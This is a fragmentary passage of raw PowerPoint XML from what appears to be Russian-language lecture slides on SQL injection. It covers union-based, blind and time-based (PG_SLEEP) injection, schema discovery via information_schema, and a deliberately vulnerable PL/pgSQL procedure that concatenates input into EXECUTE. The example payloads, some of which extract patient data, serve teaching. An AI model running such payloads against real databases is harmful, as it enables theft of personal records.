                      </a:r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----------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SELECT * FROM dual </a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1050" kern="1200" dirty="0">
                        <a:effectLst/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effectLst/>
                        </a:rPr>
                        <a:t>WHERE dummy = :dummy                        2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050" kern="1200" dirty="0">
                          <a:solidFill>
                            <a:schemeClr val="accent1"/>
                          </a:solidFill>
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>1 row selected.</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr marL="0" algn="l" defTabSz="457200" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1"/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16772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F8F6A-9A4B-26D4-3566-54C5C8EF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 данных – Что важно для безопасности?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C448C1-AAE7-74EA-7C7B-4067599AB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D70875-5A64-8713-1B17-EC56EED0ECF3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6976818" y="5923484"/>
            <a:ext cx="1699638" cy="602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Автоматическая </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1400" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1400" b="1" dirty="0"/>
              <a:t>проверка типа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7AE2A9-C505-23F5-C011-8F853993FBFD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7236296" y="4528151"/>
            <a:ext cx="1646559" cy="3092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Нет проверок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2854A3-B22A-A36D-DCB6-28B9E28D96CD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3923928" y="2497943"/>
            <a:ext cx="1906037" cy="3092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Нет проверок</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="31623429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Безопасность динамического SQL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инъекции в языки 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349D8-6FA5-2D01-8311-6D64E426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Инъекции в языки запросов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A26B4-EE11-D744-7CD5-5DDE4955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3600400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ru-RU" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Инъекция</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C00000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> в язык запросов  </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>- атака на базу данных, заставляющая сервер СУБД выполнить не легитимный набор действий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Проведение </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>- инъекции возможно:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>При выборке данных в СУБД</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>При модификации данных в СУБД</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>При вызове функций и процедур</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>При вызове курсоров и т.д.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>…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C3136F-E6B3-31AD-E791-CC34D062C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7C8B6-9224-54F7-1697-FB06E06DD6C3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3635896" y="5005599"/>
            <a:ext cx="45720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Тип языка запросов </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>влияет на </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent1"/>
                </a:solidFill>
              </a:rPr>
              <a:t>способ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>проведения инъекции, </a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>а </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2"/>
                </a:solidFill>
              </a:rPr>
              <a:t>не на возможность </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>ее проведения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4102386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14950-C6C4-EBE2-930A-E9DFB443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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQLi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1EF955-B1FB-CF6C-C242-5384BCDB1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DADFA8A-619F-EB08-1657-EA9DE5EB1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544" y="1340768"/>
            <a:ext cx="8208912" cy="532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039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0A55F-F0A3-FD6B-468A-05232E30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Обычная </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL - </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t>инъекция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7B0E94-190F-C124-F01B-B5D0CB4AC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  <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Рисунок 20">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7185E601-8BEE-9D78-3FA2-C17CBEC8E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20" y="1700808"/>
            <a:ext cx="8091959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8178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28D32-67FC-DFD9-EE33-AF9EE15A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«Слепая» инъекция – основанная на ошибке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DA09D7-01FA-A6A2-A7E8-FB4B51716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7A900A-5F53-6507-AF30-E93F136F06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183" y="2492896"/>
            <a:ext cx="8496944" cy="15519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0DFB22-04E8-D1F7-79A5-B90C9F9061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0108" y="4420594"/>
            <a:ext cx="5994100" cy="208108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F35B37-A4BD-9EDA-6AA2-117F9CBCDC66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1024082" y="1396863"/>
            <a:ext cx="4758421" cy="6093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Surname FROM Patient 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Email_doctor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‘INCORRECT_EMAIL’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B8704EF-5189-682E-DFCD-B52D019D0B64}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3246617" y="3655185"/>
            <a:ext cx="965343" cy="493895"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DB3519">
              <a:alpha val="14902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39E7D24-DB8B-CD71-E520-27C10831B585}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4283968" y="3655185"/>
            <a:ext cx="4566159" cy="493895"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DB3519">
              <a:alpha val="14902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881A0ED-E95D-C4BA-FC76-EF106477E2C2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4716016" y="6046297"/>
            <a:ext cx="1728192" cy="493895"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="DB3519">
              <a:alpha val="14902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1784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2D914-EBFC-2D50-F9D2-7E1F3516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«Двойная слепая» (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>double blind)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" dirty="0"/>
              <a:t> инъекция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82AED6-5CEB-770A-FB9D-DEF44C489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C5BE12-D680-952D-8365-5665A7CAEF4E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="323528" y="1484784"/>
            <a:ext cx="7992888" cy="6093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CALL </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400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Inj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('botkin.s@mail.ru'' </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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ru-RU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 1=(SELECT 1 FROM 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PG_SLEEP(3))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--');</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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61BE55-26ED-E348-080A-6C07508E52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83768" y="2333492"/>
            <a:ext cx="5832648" cy="21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580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E941B-33FB-3678-4FB2-9DD573D3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Информированность злоумышленника – получение схемы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E3AD45-BCB8-2608-8025-AE4814462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5C7AB-C589-A47B-43C5-5891E61C5AB2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="458773" y="1493755"/>
            <a:ext cx="5789969" cy="748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Пусть есть уязвимый запрос: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173924F-4BB6-F893-7579-77B13C6C9377}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="458773" y="3539699"/>
            <a:ext cx="7425595" cy="748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Тогда зная название таблиц и их столбцов возможно узнать данные из другой таблицы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4D8CC7D-3769-D16A-46BD-F81EB64B920B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2267744" y="2222048"/>
            <a:ext cx="6104358" cy="743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Name, Surname from patient </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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email_doctor</a:t>
            </a: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 '***' </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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F54453-8507-6B37-A4EA-41278547B32E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2267744" y="4635592"/>
            <a:ext cx="6104358" cy="1075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Name, Surname from patient </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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email_doctor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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='botkin.s@mail.ru' </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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union select Name, Surname from doctor;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704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E941B-33FB-3678-4FB2-9DD573D3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Информированность злоумышленника – схема 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E3AD45-BCB8-2608-8025-AE4814462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55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9B89895-B605-7815-4709-ABC3E750CE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9038" y="2326277"/>
          <a:ext cx="8640960" cy="35052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4274931369"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3523652">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2207290360"/>
                    </a:ext>
                  </a:extLst>
                </a:gridCol>
                <a:gridCol w="3533132">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="3436084419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indent="0" algn="ctr"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СУБД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Первая запись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Вторая запись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292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MySQL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 union select name,123 from users limit 0,1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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/?id=1 union select name,123 from users limit 1,1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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82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MS SQL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 union select table_name,123 from (select </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>row_number</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>() over (order by name) as </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>rownum</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, name from users) as t where </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>t.rownum</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>=1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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 union select table_name,123 from (select </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>row_number</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>() over (order by name) as </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>rownum</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>, name from users) as t where </a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>t.rownum</a:t>
                      </a:r>
                      <a:r>
                        <a:rPr lang="en-US" sz="1600" dirty="0">
                          <a:effectLst/>
                        </a:rPr>
                        <a:t>=2</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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576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PostgreSQL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 union select name, null from users limit 1 offset 0</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr indent="0" algn="ctr"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ИЛИ</a:t>
                      </a:r>
                    </a:p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/?id=1; select name, 123 from users limit 1 offset 0</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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 union select name, null from users limit 1 offset 1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU" sz="1800" dirty="0">
                        <a:effectLst/>
                      </a:endParaRPr>
                    </a:p>
                    <a:p>
                      <a:pPr indent="0" algn="ctr"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ИЛИ</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:pPr indent="0" algn="just"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/?id=1; select name, 123 from users limit 1 offset 1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ru-RU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2796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72334-EC8B-DBE8-7ADD-C8F38F1EE340}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr txBox="1"/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="432048" y="1391325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выбор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-й записи в таблице, зная ее имя на разных СУБД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72334-EC8B-DBE8-7ADD-C8F38F1EE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48" y="1391325"/>
                <a:ext cx="4572000" cy="646331"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:blipFill>
                <a:blip r:embed="rId2"/>
                <a:stretch>
                  <a:fillRect l="-1200" t="-5660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8514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EE0E8-B39F-243E-76F4-EB381F90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Узнаем имя таблицы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9BAB4-F8BA-D061-607E-F3E1A05C5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7CCAD8A-4974-E665-687E-CC5009A42C15}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="522868" y="1673570"/>
            <a:ext cx="4875568" cy="1632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Name, Surname from patient </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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400" dirty="0" err="1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email_doctor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="dk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='botkin.s@mail.ru' </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="dk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union </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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table_schema,table_name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2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information_schema.tables</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent2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 BY 1—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1528849-1C31-9CC5-F1A0-1BFD13B19E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91680" y="3877191"/>
            <a:ext cx="5472608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549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EE0E8-B39F-243E-76F4-EB381F90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Узнаем схему (атрибуты) таблицы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9BAB4-F8BA-D061-607E-F3E1A05C5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F322C3-DB54-E764-7E48-BE0967C9EB6C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="683568" y="1412776"/>
            <a:ext cx="4875568" cy="26668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0215" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc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Name, Surname from patient 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email_doctor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='botkin.s@mail.ru' </a:t>
            </a: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union </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400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"</a:t>
            </a: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column_name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ordinal_position</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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::text </a:t>
            </a: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information_schema.columns</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="accent2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0215" algn="just"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20000"/>
              </a:lnSpc>
            </a:pP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table_catalog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'hospital' and </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="450215" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pP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table_schema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'public' and </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="450215" algn="just">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
            </a:pP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table_name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'doctor';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B36B23-07C1-076A-0696-D1C4AF9608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88024" y="2492896"/>
            <a:ext cx="3920090" cy="38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255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4E8C2-420A-A4B0-4FAB-B0CF1612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Инъекция во входной параметр - строковый параметр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46909-26FD-76BE-A494-C8C51AC50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F6046F0-7286-0769-EEE6-EDCBA418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2304727"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Исходный запрос</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3694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Patient where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3694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email_doctor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3694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r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Подставляемая строка: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1=1--'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Итоговый запрос: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Patient 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email_doctor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'botkin.s@mail.ru'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1=1--'</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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E28A479-F953-1FF3-3DCE-BC3A063A1E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7544" y="3645024"/>
            <a:ext cx="7776864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102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4E8C2-420A-A4B0-4FAB-B0CF1612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Инъекция во входной параметр - числовой параметр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46909-26FD-76BE-A494-C8C51AC50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F6046F0-7286-0769-EEE6-EDCBA418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2304727"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Исходный запрос</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: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b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3694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Patient where </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="3694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ID_client</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3694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endParaRPr lang="ru-RU" sz="1600" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="36946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/>
              <a:t>Подставляемая строка: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1=1--'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>Итоговый запрос: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Patient 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ID_client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1=1--'</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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8B1F6F-8D7A-6BB0-4EB8-2A4782F250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1186" y="3645024"/>
            <a:ext cx="748920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051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4E8C2-420A-A4B0-4FAB-B0CF1612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Инъекция в прямой запрос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46909-26FD-76BE-A494-C8C51AC50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31392BE-A6A9-804B-2A52-DA2889FB4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ru-RU" sz="1600" dirty="0"/>
              <a:t>Исходный запрос</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
              <a:t>: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Patient where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email_doctor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:email;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/>
              <a:t>Подставляемая строка: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\set email '\'botkin.s@mail.ru\' OR \'1\'=\'1\'';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU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/>
              <a:t>Итоговый запрос:</a:t>
            </a:r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Patient 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email_doctor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'botkin.s@mail.ru' OR '1'='1';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A85E45-F123-6DF4-C8D0-ED7B519E06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11" y="4005064"/>
            <a:ext cx="7920880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96773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063245B-813F-1B43-1984-A0CCC1EED30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55127" y="4933473"/>
            <a:ext cx="5833746" cy="177618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4E8C2-420A-A4B0-4FAB-B0CF1612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Инъекция в процедуру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46909-26FD-76BE-A494-C8C51AC50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61</a:t>
            </a:fld>
            <a:endParaRPr lang="ru-RU"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{306F7E1B-A4A2-4B12-7C72-707F6437AE84}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="677334" y="1167621"/>
            <a:ext cx="3977793" cy="624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Процедура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E8BB0B-ACEB-C3F8-96CA-5175FDF2D784}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="467544" y="1740157"/>
            <a:ext cx="4896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CREATE OR REPLACE PROCEDURE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Inj</a:t>
            </a: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(email VARCHAR(50))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LANGUAGE PLPGSQL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AS $$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DECLARE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res VARCHAR(50);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ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>req</a:t>
            </a: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 VARCHAR(500);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BEGIN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ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>req</a:t>
            </a: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 := 'SELECT Surname FROM Patient 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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1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Email_doctor</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="12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= '''||email||'''';</a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1200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EXECUTE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0" err="1">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>req</a:t>
            </a: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 INTO res;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	RAISE INFO '%', res;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</a:rPr>
              <a:t>END</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ru-RU" sz="1200" dirty="0">
                <a:latin typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
                <a:ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> $$;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F28E8A1C-2077-0AAB-20D2-95780E485A00}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5573878" y="1268760"/>
            <a:ext cx="3977793" cy="624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Инъекция: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3F3D34F-4DB1-8EE5-4774-C7EDCD41AD66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5568646" y="1814747"/>
            <a:ext cx="3395842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CALL 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</a:rPr>
              <a:t>Inj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('INCORRECT_EMAIL'' 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UNION </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill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select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Patient.Telephone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::text </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="C00000"/>
              </a:solidFill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ru-RU" sz="14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      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from Patient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	 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JOIN Operation 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ON </a:t>
            </a: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Patient.ID_client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= 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Operation.ID_client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endParaRPr lang="ru-RU" sz="1400" dirty="0">
              <a:solidFill>
                <a:schemeClr val="accent1"/>
              </a:solidFill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where </a:t>
            </a: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id_operation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ea typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> = 1--'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);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</a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Объект 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C3A482EC-0B27-D618-75E5-C29FCA826FE6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="269090" y="4058353"/>
            <a:ext cx="3977793" cy="6241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отличается от предыдущей</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="ru-RU" sz="1600" dirty="0"/>
              <a:t>только автоматической проверкой типа</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32010720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EA144-8A6D-97CD-9CCC-819A72B0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Использование комментария для усечения запроса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61EEE2-EA39-5C48-0158-2DDDF59B9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Исходный запрос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UserlD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FROM Users </a:t>
            </a:r>
            <a:endParaRPr lang="ru-RU" sz="16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'Joe' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
